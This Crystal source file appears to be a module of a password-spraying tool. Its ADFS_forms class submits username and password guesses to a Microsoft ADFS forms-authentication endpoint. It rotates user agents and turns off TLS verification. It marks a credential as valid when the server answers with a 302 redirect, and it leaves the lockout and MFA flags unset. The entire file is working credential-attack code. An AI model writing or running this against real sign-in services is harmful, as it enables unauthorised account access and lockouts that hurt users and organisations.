require "http/client"

class ADFS_forms < Sprayer
    property domain : String | Nil
    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "WORKGROUP"
    end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # YOUR CODE BELOW 
        #
        path = "/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc="
        

        # some basic setups for web based auth 
        url = URI.parse "#{@target}#{path}" 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # headers for post request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
        }
        if @domain.nil?
            form = "UserName=#{URI.encode_www_form(username)}&Password=#{ URI.encode_www_form(password) }&AuthMethod=FormsAuthentication" 
        else 
            form = "UserName=#{URI.encode_www_form(@domain.not_nil!)}%5C#{URI.encode_www_form(username)}&Password=#{ URI.encode_www_form(password) }&AuthMethod=FormsAuthentication"
        end
        # here is the basic 
        page = client.post("#{"/#{url.path.strip("/")}" if url.path != "" }#{path}", headers: header, form: form)

        if page.status_code == 302
            valid = true 
        end


        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end